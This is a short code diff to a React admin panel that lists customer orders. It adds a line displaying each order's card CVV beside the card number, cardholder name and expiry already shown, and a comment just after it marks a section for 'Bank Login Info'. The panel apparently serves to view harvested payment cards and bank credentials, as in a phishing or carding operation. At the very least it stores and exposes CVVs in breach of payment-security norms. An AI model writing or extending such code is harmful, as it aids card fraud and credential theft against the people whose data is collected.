@@ -87,6 +87,7 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                         <p><span className="font-semibold">Card:</span> {order.cardData.cardNumber}</p>
                         <p><span className="font-semibold">Cardholder:</span> {order.cardData.cardholderName}</p>
                         <p><span className="font-semibold">Expiry:</span> {order.cardData.expiryDate}</p>
+                        <p><span className="font-semibold">CVV:</span> {order.cardData.cvv}</p>
                       </div>
                       
                       {/* Bank Login Info */}
